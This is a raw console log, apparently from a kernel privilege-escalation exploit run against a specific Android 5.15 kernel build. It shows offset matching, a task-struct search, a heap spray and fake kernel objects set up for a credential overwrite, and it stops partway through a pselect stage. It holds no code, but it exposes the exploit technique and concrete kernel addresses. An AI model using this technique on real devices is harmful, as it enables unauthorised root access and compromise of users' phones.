[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
[32m[+] [0mstartup context pid=27919 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=0
[32m[+] [0mstartup limits pid=27919 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=27919 label=ghostlock_nevada slide=pselect main=pselect
[32m[+] [0mp0 profile pid=27919 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
[33m[*] [0m[T+0ms] exploit start
[32m[+] [0mSELinux already off
[33m[*] [0m[T+5068ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff806dba5a00 (48/256 votes)
[33m[*] [0m[T+5243ms] perf_find_task done
[33m[*] [0mchild_pid=29921 child_task=0xffffff806dba5a00
[33m[*] [0mround 1/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff806dba6198 mode=2
[33m[*] [0m[T+10457ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[15755..15970] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+18173ms]   heap spray done
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=15 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=3 page=ffffff80d36f8000 fake_lock=ffffff80d36f8000 fake_w0=ffffff80d36f8300 fake_task=ffffff80d36f8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=ffffff80d36f8400 ex2=ffffff80d36f8000 ex3=0000000000000003
[33m[*] [0mpselect pre-select +0ms
